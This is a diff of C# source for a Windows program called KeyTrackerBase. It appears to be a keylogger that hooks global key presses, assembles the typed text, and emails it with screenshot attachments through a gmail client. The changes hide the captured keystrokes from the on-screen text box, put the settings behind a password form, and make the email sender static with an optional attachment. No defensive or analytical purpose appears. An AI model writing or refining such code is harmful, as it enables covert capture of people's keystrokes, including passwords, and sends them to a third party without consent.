@@ -132,8 +132,8 @@ namespace KeyTrackerBase
         //opens settings form on click in menu
         void settingsItem_Click(object sender, EventArgs e)
         {
-            Settings settingsForm = new Settings();
-            settingsForm.Show();
+            Password passwordForm = new Password();
+            passwordForm.Show();
         }
 
         //quits the program
@@ -152,6 +152,7 @@ namespace KeyTrackerBase
 
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
+            //validates if the program is turned on via. settings
             if (settings[1] == "on")
             {
                 RoutedEventArgs f = new RoutedEventArgs();
@@ -171,7 +172,6 @@ namespace KeyTrackerBase
                     if (sentence != "")
                     {
                         sentence = sentence.Remove(sentence.Length - 1);
-                        textBox1.Text = sentence;
                         e.Handled = false;
                     }
                 }
@@ -190,7 +190,6 @@ namespace KeyTrackerBase
                                 if (e.Shift != true && e.KeyValue != 191)//question mark
                                 {
                                     sentence += ((char)e.KeyValue).ToString().ToLower();
-                                    textBox1.Text = sentence;
 
                                     if (sentence != "\r")//ensures no 'returns' are by themself
                                     {
@@ -314,7 +313,7 @@ namespace KeyTrackerBase
         }
 
         //EMAIL WORKING PERFECTLY! - ADD TIME AND DATE STAMP
-        public void SendEmail(string to, string subject, string body, string path)
+        public static void SendEmail(string to, string subject, string body, string path)
         {
             try
             {
@@ -328,8 +327,10 @@ namespace KeyTrackerBase
                 //subject or title of the email
                 message.Subject = (subject);//gets username currently logged in
                 //attachment code of the screenshot, direct acess to file path of the screenshot or it can be replaced by a variable
-                message.Attachments.Add(new Attachment(path));
-
+                if (path != null)
+                {
+                    message.Attachments.Add(new Attachment(path));
+                }
                 //------------------------------end----------------------------------------------
 
                 //------------------------------Email client used (gmail)------------------------------
